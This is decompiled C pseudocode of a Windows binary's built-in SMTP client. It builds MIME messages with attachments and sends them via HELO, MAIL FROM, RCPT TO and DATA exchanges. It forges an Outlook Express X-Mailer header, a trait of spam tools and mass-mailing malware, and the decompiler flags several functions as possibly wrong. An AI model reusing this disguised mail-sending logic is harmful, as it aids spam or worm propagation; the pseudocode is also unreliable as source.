//----- (004122C8) --------------------------------------------------------
int __usercall sub_4122C8@<eax>(int *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<edi>)
{
  unsigned int v6[2]; // [esp-10h] [ebp-20h] BYREF
  int *v7; // [esp-8h] [ebp-18h]
  int v8; // [esp-4h] [ebp-14h]
  __int32 v9; // [esp+0h] [ebp-10h] BYREF
  char *v10; // [esp+4h] [ebp-Ch] BYREF
  char *v11; // [esp+8h] [ebp-8h] BYREF
  int *v12; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = a3;
  v12 = a1;
  sub_4038D8((int)a1);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41235C;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_4114A8(v12, &v11, (int)a2);
  sub_41140C(v12, &v10, (int)a2);
  if ( v11 )
  {
    sub_412240((int)v11, &v9, a4);
    sub_4037E4(a2, 5);
  }
  else
  {
    sub_40351C(a2, (__int32)v10);
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_412363;
  return sub_4034EC((int)&v9, 4);
}
// 4122C8: could not find valid save-restore pair for ebx

//----- (0041238C) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_41238C@<eax>(volatile __int32 *a1@<eax>)
{
  int v2; // eax
  _DWORD v4[5]; // [esp-14h] [ebp-18h] BYREF
  char *v5; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4[2] = &savedregs;
  v4[1] = &loc_4123F2;
  v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_4027C0();
  v2 = sub_4028F4(0x7FFFFFFFu);
  sub_40701C(v2, 8, &v5);
  sub_4037E4(a1, 3);
  __writefsdword(0, v4[4]);
  savedregs = &loc_4123F9;
  return sub_4034C8(&v5);
}
// 4123EC: bad sp value at call

//----- (0041243C) --------------------------------------------------------
int sub_41243C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_412478;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_41E668 )
    sub_403BE8((int *)&off_41D76C, (char *)dword_401004, 48);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41D76C: using guessed type int (*off_41D76C)[21];
// 41E668: using guessed type int dword_41E668;

//----- (00412484) --------------------------------------------------------
void sub_412484()
{
  --dword_41E668;
}
// 41E668: using guessed type int dword_41E668;

//----- (00412560) --------------------------------------------------------
_DWORD *__usercall sub_412560@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi

  if ( a2 )
    a1 = (_DWORD *)sub_402CDC((int)a1, a2);
  v2 = a2;
  v3 = a1;
  sub_402BAC(a1, 0);
  v3[1] = sub_402BAC(&off_40B908, 1);
  v3[2] = sub_402BAC(&off_40BBB4, 1);
  v3[4] = sub_402BAC(&off_40BBB4, 1);
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 41256E: variable 'a2' is possibly undefined
// 40B908: using guessed type void *off_40B908;
// 40BBB4: using guessed type void *off_40BBB4;

//----- (004125C4) --------------------------------------------------------
_DWORD *__usercall sub_4125C4@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_402BDC((_DWORD *)v2[4]);
  sub_402BDC((_DWORD *)v5[2]);
  sub_402BDC((_DWORD *)v5[1]);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 4125CB: variable 'v3' is possibly undefined

//----- (00412604) --------------------------------------------------------
int __usercall sub_412604@<eax>(int a1@<eax>)
{
  _DWORD *v2; // eax

  v2 = sub_411838(dword_411690, 1);
  return sub_40C0D0(*(_DWORD **)(a1 + 4), (int)v2);
}
// 411690: using guessed type int dword_411690[2];

//----- (00412620) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_412620@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v4; // edi
  int v5; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-1Ch] BYREF
  void *v8; // [esp-14h] [ebp-18h]
  void **v9; // [esp-10h] [ebp-14h]
  int v10; // [esp-Ch] [ebp-10h]
  int v11; // [esp-8h] [ebp-Ch]
  unsigned int v12; // [esp-4h] [ebp-8h]
  int v13; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v13 = 0;
  v9 = &savedregs;
  v8 = &loc_4126BE;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v4 = sub_412604(a1);
  v5 = sub_40C20C(*(_DWORD *)(a1 + 4), v4);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, void **, int, int))(*(_DWORD *)a2 + 104))(
    ExceptionList,
    v8,
    v9,
    v10,
    v11);
  sub_411F70(v5, "text");
  sub_40351C((volatile __int32 *)(v5 + 20), (__int32)"plain");
  sub_40351C((volatile __int32 *)(v5 + 24), (__int32)"message text");
  (*(void (**)(void))(*(_DWORD *)a2 + 28))();
  *(_BYTE *)(v5 + 18) = sub_40F230(v13, *(_BYTE *)(v5 + 19), 1023);
  *(_BYTE *)(v5 + 17) = 2;
  sub_4118CC(v5);
  __writefsdword(0, v12);
  savedregs = &loc_4126C5;
  return sub_4034C8(&v13);
}
// 4126B8: bad sp value at call

//----- (00412708) --------------------------------------------------------
int __usercall sub_412708@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v6; // esi
  int v7; // ebx
  unsigned int v9[2]; // [esp-14h] [ebp-20h] BYREF
  int *v10; // [esp-Ch] [ebp-18h]
  int v11; // [esp-8h] [ebp-14h]
  int v12; // [esp-4h] [ebp-10h]
  char *v13; // [esp+0h] [ebp-Ch] BYREF
  char *v14; // [esp+4h] [ebp-8h] BYREF
  char *v15; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v14 = 0;
  v13 = 0;
  v12 = a3;
  v11 = a5;
  v15 = a2;
  sub_4038D8((int)a2);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_4127DC;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v6 = sub_412604(a1);
  v7 = sub_40C20C(*(_DWORD *)(a1 + 4), v6);
  sub_40DB00(*(_DWORD *)(v7 + 40), v15);
  sub_411E58(v7, v15, v7, a4, v6);
  sub_4073EC(v15, &v13);
  sub_406E9C((int)v13, &v14);
  sub_40351C((volatile __int32 *)(v7 + 32), (__int32)v14);
  if ( sub_4039B4(dword_4127F4, *(_BYTE **)(v7 + 32)) )
    sub_4037E4((volatile __int32 *)(v7 + 24), 3);
  else
    sub_403770((volatile __int32 *)(v7 + 24), "attachment;  filename=", *(char **)(v7 + 32));
  *(_BYTE *)(v7 + 17) = 3;
  sub_4118CC(v7);
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_4127E3;
  return sub_4034EC((int)&v13, 3);
}
// 412708: could not find valid save-restore pair for ebx
// 412708: could not find valid save-restore pair for esi
// 4127F4: using guessed type int dword_4127F4[3];

//----- (00412844) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_412844@<eax>(
        int a1@<eax>,
        struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebx>,
        int a3@<edi>,
        int a4@<esi>)
{
  int v5; // eax
  int v6; // esi
  int v7; // edi
  _DWORD v9[5]; // [esp-18h] [ebp-28h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-4h] [ebp-14h] BYREF
  void *v11; // [esp+0h] [ebp-10h] BYREF
  void **v12; // [esp+4h] [ebp-Ch] BYREF
  volatile __int32 *v13; // [esp+8h] [ebp-8h]
  char *v14; // [esp+Ch] [ebp-4h] BYREF
  void *savedregs; // [esp+10h] [ebp+0h] BYREF

  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  ExceptionList = a2;
  v9[4] = a4;
  v9[3] = a3;
  v9[2] = &savedregs;
  v9[1] = &loc_4129AB;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  (*(void (__stdcall **)(_DWORD, void *, void **, int, int, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD, _DWORD))(**(_DWORD **)(a1 + 8) + 64))(
    v9[0],
    &loc_4129AB,
    &savedregs,
    a3,
    a4,
    ExceptionList,
    0,
    0);
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 8) == 1 )
  {
    sub_40C20C(*(_DWORD *)(a1 + 4), 0);
    (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 8))();
  }
  else
  {
    sub_41238C((volatile __int32 *)&v14);
    v5 = *(_DWORD *)(a1 + 4);
    if ( *(_DWORD *)(v5 + 8) - 1 >= 0 )
    {
      v6 = *(_DWORD *)(v5 + 8);
      v7 = 0;
      do
      {
        sub_403770((volatile __int32 *)&v12, (char *)dword_4129C4, v14);
        (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 52))();
        sub_40C20C(*(_DWORD *)(a1 + 4), v7);
        (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 60))();
        ++v7;
        --v6;
      }
      while ( v6 );
    }
    sub_403770((volatile __int32 *)&v11, (char *)dword_4129C4, v14);
    (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 52))();
    v13 = sub_411838(dword_411690, 1);
    v12 = &savedregs;
    v11 = &loc_412981;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, void **))(**(_DWORD **)(a1 + 8) + 104))(
      ExceptionList,
      &loc_412981,
      &savedregs);
    sub_411F70((int)v13, "multipart");
    sub_40351C(v13 + 5, (__int32)"mixed");
    sub_40351C(v13 + 6, (__int32)"Multipart message");
    sub_40351C(v13 + 7, (__int32)v14);
    sub_4118CC((int)v13);
    (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 8))();
    __writefsdword(0, (unsigned int)v13);
    savedregs = &loc_412988;
    sub_402BDC(v13);
  }
  __writefsdword(0, (unsigned int)v13);
  savedregs = &loc_4129B2;
  sub_4034EC((int)&v11, 2);
  return sub_4034C8(&v14);
}
// 412844: could not find valid save-restore pair for ebx
// 412844: could not find valid save-restore pair for edi
// 412844: could not find valid save-restore pair for esi
// 4128AB: bad sp value at call
// 4128DF: bad sp value at call
// 41299D: bad sp value at call
// 4129A5: bad sp value at call
// 411690: using guessed type int dword_411690[2];
// 4129C4: using guessed type int dword_4129C4[3];

//----- (00412A08) --------------------------------------------------------
int __usercall sub_412A08@<eax>(int a1@<eax>, int a2@<edi>)
{
  unsigned __int64 v3; // st7
  int v4; // eax
  int v5; // esi
  int *v6; // eax
  int v7; // edi
  int v8; // eax
  double v10; // [esp+4h] [ebp-4Ch] BYREF
  void *v11; // [esp+Ch] [ebp-44h]
  int *v12; // [esp+10h] [ebp-40h]
  void *v13; // [esp+14h] [ebp-3Ch]
  char *v14; // [esp+20h] [ebp-30h] BYREF
  __int32 v15; // [esp+24h] [ebp-2Ch] BYREF
  int *v16; // [esp+28h] [ebp-28h] BYREF
  char *v17; // [esp+2Ch] [ebp-24h] BYREF
  __int32 v18; // [esp+30h] [ebp-20h] BYREF
  char *v19; // [esp+34h] [ebp-1Ch] BYREF
  __int32 v20; // [esp+38h] [ebp-18h] BYREF
  char *v21; // [esp+3Ch] [ebp-14h] BYREF
  __int32 v22; // [esp+40h] [ebp-10h] BYREF
  char *v23; // [esp+44h] [ebp-Ch] BYREF
  __int32 v24; // [esp+48h] [ebp-8h] BYREF
  int v25; // [esp+4Ch] [ebp-4h]
  int savedregs; // [esp+50h] [ebp+0h] BYREF

  v12 = &savedregs;
  v11 = &loc_412B7A;
  HIDWORD(v10) = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v10 + 4);
  (*(void (__fastcall **)(const char *, _DWORD, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(
    "X-Mailer: Microsoft Outlook Express 5.50.4133.2400",
    0,
    HIDWORD(v10));
  (*(void (__fastcall **)(const char *, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(
    "X-MIMEOLE: Produced By Microsoft MimeOLE V5.50.4133.2400",
    0);
  (*(void (__fastcall **)(const char *, _DWORD))(**(_DWORD **)(a1 + 8) + 84))("MIME-Version: 1.0", 0);
  *(double *)&v3 = sub_408090();
  sub_411110(&v23, v3, HIDWORD(v3));
  sub_403770(&v24, "date: ", v23);
  (*(void (__fastcall **)(__int32, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(v24, 0);
  if ( *(_DWORD *)(a1 + 24) )
  {
    sub_412240(*(_DWORD *)(a1 + 24), (volatile __int32 *)&v21, a2);
    sub_403770(&v22, "Organization: ", v21);
    (*(void (__fastcall **)(__int32, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(v22, 0);
  }
  if ( *(_DWORD *)(a1 + 20) )
  {
    sub_412240(*(_DWORD *)(a1 + 20), (volatile __int32 *)&v19, a2);
    sub_403770(&v20, "Subject: ", v19);
    (*(void (__fastcall **)(__int32, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(v20, 0);
  }
  v4 = (*(int (**)(void))(**(_DWORD **)(a1 + 16) + 20))();
  if ( v4 - 1 >= 0 )
  {
    v5 = v4;
    v25 = 0;
    do
    {
      v6 = *(int **)(a1 + 16);
      v7 = *v6;
      (*(void (__fastcall **)(int **, int))(*v6 + 12))(&v16, v25);
      sub_4122C8(v16, (volatile __int32 *)&v17, a1, v7);
      sub_403770(&v18, "To: ", v17);
      v8 = *(_DWORD *)(a1 + 8);
      a2 = *(_DWORD *)v8;
      (*(void (__fastcall **)(__int32, _DWORD))(*(_DWORD *)v8 + 84))(v18, 0);
      ++v25;
      --v5;
    }
    while ( v5 );
  }
  sub_4122C8(*(int **)(a1 + 12), (volatile __int32 *)&v14, a1, a2);
  sub_403770(&v15, "From: ", v14);
  (*(void (__fastcall **)(__int32, _DWORD))(**(_DWORD **)(a1 + 8) + 84))(v15, 0);
  __writefsdword(0, (unsigned int)v11);
  v13 = &loc_412B81;
  return sub_4034EC((int)&v14, 11);
}

//----- (00412C80) --------------------------------------------------------
int sub_412C80()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_412CA5;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E66C;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E66C: using guessed type int dword_41E66C;

//----- (00412CB0) --------------------------------------------------------
void sub_412CB0()
{
  --dword_41E66C;
}
// 41E66C: using guessed type int dword_41E66C;

//----- (00412D28) --------------------------------------------------------
_DWORD *__usercall sub_412D28@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // edi
  void (***v4)(void); // esi

  if ( a2 )
    a1 = (_DWORD *)sub_402CDC((int)a1, a2);
  v2 = a2;
  v3 = a1;
  sub_402BAC(a1, 0);
  v4 = (void (***)(void))sub_40F908(&off_40F8D4, 1);
  v3[1] = v4;
  (**v4)();
  v3[2] = 300000;
  sub_40351C(v3 + 3, (__int32)"localhost");
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 412D37: variable 'a2' is possibly undefined
// 40F8D4: using guessed type int (*off_40F8D4)();

//----- (00412DA0) --------------------------------------------------------
_DWORD *__usercall sub_412DA0@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_402BDC((_DWORD *)v2[1]);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 412DA7: variable 'v3' is possibly undefined

//----- (00412DD0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_412DD0@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int v5; // esi
  char *v6; // ecx
  _DWORD v8[4]; // [esp-18h] [ebp-20h] BYREF
  int v9; // [esp-8h] [ebp-10h]
  int v10; // [esp-4h] [ebp-Ch]
  char *v11; // [esp+0h] [ebp-8h] BYREF
  _BYTE *v12; // [esp+4h] [ebp-4h] BYREF
  void *savedregs; // [esp+8h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = a2;
  v9 = a4;
  v8[3] = a3;
  v8[2] = &savedregs;
  v8[1] = &loc_412E81;
  v8[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v5 = 0;
  (*(void (__fastcall **)(_BYTE **, _DWORD, _DWORD, void *, void **, int, int, int))(**(_DWORD **)(a1 + 4) + 24))(
    &v12,
    *(_DWORD *)(a1 + 8),
    v8[0],
    &loc_412E81,
    &savedregs,
    a3,
    v9,
    v10);
  sub_40351C((volatile __int32 *)(a1 + 20), (__int32)v12);
  if ( sub_403724((int)v12) >= 3 )
  {
    sub_40392C((int)v12, 1, 3, &v11);
    v5 = sub_407058((int)v11, 0, v6);
  }
  while ( sub_4039B4(&dword_412E9C, v12) == (_BYTE *)4 )
  {
    (*(void (__fastcall **)(_BYTE **, _DWORD))(**(_DWORD **)(a1 + 4) + 24))(&v12, *(_DWORD *)(a1 + 8));
    if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 40) )
    {
      v5 = 0;
      break;
    }
  }
  *(_DWORD *)(a1 + 16) = v5;
  __writefsdword(0, (unsigned int)v11);
  savedregs = &loc_412E88;
  sub_4034EC((int)&v11, 2);
  return v5;
}
// 412DD0: could not find valid save-restore pair for ebx
// 412DD0: could not find valid save-restore pair for edi
// 412DD0: could not find valid save-restore pair for esi
// 412E7B: bad sp value at call
// 412E2D: variable 'v6' is possibly undefined
// 412E9C: using guessed type int dword_412E9C;

//----- (00412EA0) --------------------------------------------------------
int __usercall sub_412EA0@<eax>(int a1@<eax>, int a2@<edi>)
{
  int v3; // ebx
  int v4; // ecx
  int v5; // edi
  unsigned int v7[2]; // [esp-18h] [ebp-20h] BYREF
  int *v8; // [esp-10h] [ebp-18h]
  char *v9; // [esp+0h] [ebp-8h] BYREF
  __int32 v10; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_412F3F;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v3 = 0;
  sub_40FAD4(*(_DWORD *)(a1 + 4), *(char **)(a1 + 12), "smtp");
  if ( !*(_DWORD *)(*(_DWORD *)(a1 + 4) + 40) && sub_412DD0(a1, 0, a2, a1) == 220 )
  {
    v5 = *(_DWORD *)(a1 + 4);
    sub_410074(v4, &v9);
    sub_4037E4(&v10, 3);
    (*(void (**)(void))(*(_DWORD *)v5 + 12))();
    if ( sub_412DD0(a1, 0, v5, a1) == 250 )
      LOBYTE(v3) = 1;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_412F46;
  sub_4034EC((int)&v9, 2);
  return v3;
}
// 412EF0: variable 'v4' is possibly undefined

//----- (00412F7C) --------------------------------------------------------
int __usercall sub_412F7C@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
  sub_412DD0(a1, a1, a2, a3);
  return sub_40FAC8(*(_DWORD *)(a1 + 4));
}

//----- (00412FB0) --------------------------------------------------------
int __usercall sub_412FB0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v4; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v7; // [esp-8h] [ebp-18h]
  int *v8; // [esp-4h] [ebp-14h]
  void *v9; // [esp+0h] [ebp-10h]
  __int32 v10[2]; // [esp+8h] [ebp-8h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10[0] = 0;
  v10[1] = a2;
  sub_4038D8(a2);
  v8 = &savedregs;
  v7 = &loc_41302F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v4 = 0;
  sub_4037E4(v10, 4);
  (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
  if ( sub_412DD0(a1, 0, a3, a1) == 250 )
    LOBYTE(v4) = 1;
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_413036;
  sub_4034EC((int)v10, 2);
  return v4;
}

//----- (0041306C) --------------------------------------------------------
int __usercall sub_41306C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v4; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v7; // [esp-8h] [ebp-18h]
  int *v8; // [esp-4h] [ebp-14h]
  void *v9; // [esp+0h] [ebp-10h]
  __int32 v10[2]; // [esp+8h] [ebp-8h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10[0] = 0;
  v10[1] = a2;
  sub_4038D8(a2);
  v8 = &savedregs;
  v7 = &loc_4130EB;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v4 = 0;
  sub_4037E4(v10, 4);
  (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
  if ( sub_412DD0(a1, 0, a3, a1) == 250 )
    LOBYTE(v4) = 1;
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_4130F2;
  sub_4034EC((int)v10, 2);
  return v4;
}

//----- (00413128) --------------------------------------------------------
char __usercall sub_413128@<al>(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>)
{
  int v5; // eax
  int v6; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v9; // [esp-8h] [ebp-28h]
  int *v10; // [esp-4h] [ebp-24h]
  void *v11; // [esp+0h] [ebp-20h]
  __int32 v12; // [esp+Ch] [ebp-14h] BYREF
  char *v13; // [esp+10h] [ebp-10h] BYREF
  int v14; // [esp+14h] [ebp-Ch]
  char v15; // [esp+1Bh] [ebp-5h]
  int v16; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v12 = 0;
  v13 = 0;
  v16 = a2;
  v10 = &savedregs;
  v9 = &loc_413212;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v15 = 0;
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(a1 + 4) + 12))(ExceptionList);
  if ( sub_412DD0(a1, a3, a4, a1) == 354 )
  {
    v5 = (*(int (**)(void))(*(_DWORD *)v16 + 20))();
    v6 = v5 - 1;
    if ( v5 - 1 >= 0 )
    {
      v6 = v5;
      v14 = 0;
      do
      {
        a4 = *(_DWORD *)v16;
        (*(void (__fastcall **)(char **, int))(*(_DWORD *)v16 + 12))(&v13, v14);
        if ( sub_403724((int)v13) >= 1 && *v13 == 46 )
          sub_403770((volatile __int32 *)&v13, (char *)dword_41323C, v13);
        sub_403770(&v12, v13, (char *)dword_413248);
        (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
        ++v14;
        --v6;
      }
      while ( v6 );
    }
    (*(void (**)(void))(**(_DWORD **)(a1 + 4) + 12))();
    if ( sub_412DD0(a1, v6, a4, a1) == 250 )
      v15 = 1;
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_413219;
  sub_4034EC((int)&v12, 2);
  return v15;
}
// 41323C: using guessed type int dword_41323C[3];
// 413248: using guessed type int dword_413248[3];

//----- (00413258) --------------------------------------------------------
char __userpurge sub_413258@<al>(
        int a1@<eax>,
        int a2@<edx>,
        __int32 a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>,
        int a7)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-2Ch] BYREF
  void *v9; // [esp-14h] [ebp-28h]
  int *v10; // [esp-10h] [ebp-24h]
  unsigned int v11[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v12; // [esp-4h] [ebp-18h]
  _DWORD *v13; // [esp+0h] [ebp-14h]
  char v14; // [esp+7h] [ebp-Dh]
  __int32 v15; // [esp+8h] [ebp-Ch] BYREF
  int v16; // [esp+Ch] [ebp-8h]
  int v17; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v15 = a3;
  v16 = a2;
  v17 = a1;
  sub_4038D8(a1);
  sub_4038D8(v16);
  sub_4038D8(v15);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_413355;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v14 = 0;
  v13 = sub_412D28(dword_412D04, 1);
  v10 = &savedregs;
  v9 = &loc_413333;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40351C(v13 + 3, v15);
  if ( (unsigned __int8)sub_412EA0((int)v13, a5)
    && (unsigned __int8)sub_412FB0((int)v13, v17, a5)
    && (unsigned __int8)sub_41306C((int)v13, v16, a5)
    && sub_413128((int)v13, a7, a4, a5) )
  {
    sub_412F7C((int)v13, a5, a6);
    v14 = 1;
    __writefsdword(0, (unsigned int)ExceptionList);
    v10 = (int *)&loc_41333A;
    sub_402BDC(v13);
  }
  else
  {
    sub_403038((unsigned int)ExceptionList, (int)v9, (int)v10);
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_41335C;
  sub_4034EC((int)&v15, 3);
  return v14;
}
// 412D04: using guessed type int dword_412D04[2];

//----- (00413368) --------------------------------------------------------
int sub_413368()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_41338D;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E670;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E670: using guessed type int dword_41E670;

//----- (00413398) --------------------------------------------------------
void sub_413398()
{
  --dword_41E670;
}
// 41E670: using guessed type int dword_41E670;

//----- (0041376C) --------------------------------------------------------
_DWORD *__usercall sub_41376C@<eax>(int a1@<eax>, char a2@<dl>, __int16 a3@<cx>)
{
  char v3; // bl
  _DWORD *v4; // esi

  if ( a2 )
    a1 = sub_402CDC(a1, a2);
  v3 = a2;
  v4 = (_DWORD *)a1;
  *(_WORD *)(a1 + 32) = a3;
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
  if ( v3 )
    sub_402D34(v4);
  return v4;
}
// 41377A: variable 'a2' is possibly undefined
// 41377E: variable 'a3' is possibly undefined

//----- (004137A8) --------------------------------------------------------
void __usercall sub_4137A8(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v2 + 2));
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 4137AF: variable 'v3' is possibly undefined

//----- (004137CC) --------------------------------------------------------
void __usercall sub_4137CC(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (004137D8) --------------------------------------------------------
void __usercall sub_4137D8(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00413B3C) --------------------------------------------------------
signed int __usercall sub_413B3C@<eax>(signed int result@<eax>)
{
  if ( result < 0 )
    return GetSysColor((unsigned __int8)result);
  return result;
}

//----- (00413B4C) --------------------------------------------------------
char __usercall sub_413B4C@<al>(int a1@<eax>, volatile __int32 *a2@<edx>)
{
  return sub_40C06C(a1, a2, &dword_41D858, 41);
}
// 41D858: using guessed type int dword_41D858;

//----- (00413B5C) --------------------------------------------------------
